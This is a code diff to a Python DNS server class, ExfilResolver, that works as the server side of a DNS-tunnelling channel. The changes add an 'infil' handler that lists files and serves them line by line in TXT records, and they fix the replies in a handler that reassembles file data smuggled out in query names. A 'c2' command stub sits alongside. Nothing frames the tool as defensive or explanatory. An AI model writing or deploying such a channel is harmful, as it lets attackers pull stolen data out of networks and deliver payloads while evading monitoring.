@@ -25,7 +25,7 @@ class ExfilResolver(BaseResolver):
         module = qname.split(".")[-1]
         if module == "test": 
             print("Running test")
-            message = "This is a test \"" 
+            message = "This is a === ////  \"" 
             reply.add_answer(RR(request.q.qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT(message)))
             return reply
             
@@ -35,7 +35,6 @@ class ExfilResolver(BaseResolver):
         if module == "c2":
             return self.cnc(request, qname)
 
-
         if module == "in":
             return self.infil(request, qname)
         
@@ -43,9 +42,36 @@ class ExfilResolver(BaseResolver):
         reply.header.rcode = RCODE.NXDOMAIN
         return reply
 
+    
+    # files in the infil dir need to be pre-formatted currently TODO
     def infil(self, request, qname):
-        reply.head.rcode
-        reply.add_answer(RR(request.q.qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT(error)))
+        if qname.split(".")[-2] == "list":
+            reply.add_answer(RR(request.q.qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT(str(os.listdir("infil")).replace(".", "-"))))
+            return reply
+        # else
+        filename = qname.split(".")[-2].replace("-",".")
+        if filename not in os.listdir("infil"):
+            reply.head.rcode = RCODE.NXDOMAIN 
+            return reply 
+        index = qname.split(".")[-3]
+        if index == "info":
+            with open("infil/" + filename) as f:
+                message = "File is " + str(len(f.readlines())) + " lines long"
+                message += " start with [randomdata].0." + filename + "." + self.origin
+                reply.add_answer(RR(request.q.qname, QTYPE.TXT, ttl=self.ttl, rdata=TXT(message)))
+                return reply
+        if index == "minfo":
+            with open("infil/" + filename) as f:
+                message = str(len(f.readlines()))
+                reply.add_answer(RR(request.q.qname, QTYPE.TXT, ttl=self.ttl, rdata=TXT(message)))
+                return reply
+
+        indexnum = int(index)
+        
+        with open("infil/" + filename) as f:
+            line = f.readlines()[indexnum]
+            reply.add_answer(RR(request.q.qname, QTYPE.TXT, ttl=self.ttl, rdata=TXT(line)))
+
 
     # unimplemented
     def cnc(self, request, qname):
@@ -55,6 +81,8 @@ class ExfilResolver(BaseResolver):
 
         reply.header.rcode = RCODE.NXDOMAIN
         return reply
+
+
     # DNS requests for this module look like this: 
     # [data].[index].[file id].ex.[origin]
     # OR 
@@ -76,10 +104,10 @@ class ExfilResolver(BaseResolver):
             if filename not in self.files and filename not in self.keys:
                 print("New file incoming, lines:", data.split("-")[1])
                 self.files.update({filename: [None] * int(data.split("-")[1])})
-                reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("Ready")))
+                reply.add_answer(RR(request.q.qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("Ready")))
                 return reply 
             else:
-                reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("Exists")))
+                reply.add_answer(RR(request.q.qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("Exists")))
                 return reply 
             
 
@@ -88,17 +116,17 @@ class ExfilResolver(BaseResolver):
             if self.files[filename][int(index)] is None:
                 self.files[filename][int(index)] = data
             else:
-                reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("data already received")))
+                reply.add_answer(RR(request.q.qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("data already received")))
                 return reply
         except KeyError:
-            reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("File not found")))
+            reply.add_answer(RR(request.q.qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("File not found")))
             return reply
         except ValueError:
-            reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("Index not an int")))
+            reply.add_answer(RR(request.q.qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("Index not an int")))
             return reply
         self.checkfile(filename)
         # reply.header.rcode = RCODE.NXDOMAIN
-        reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("Data received")))
+        reply.add_answer(RR(request.q.qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("Data received")))
         return reply
 
     # Doing this in a seperate thread would be nice
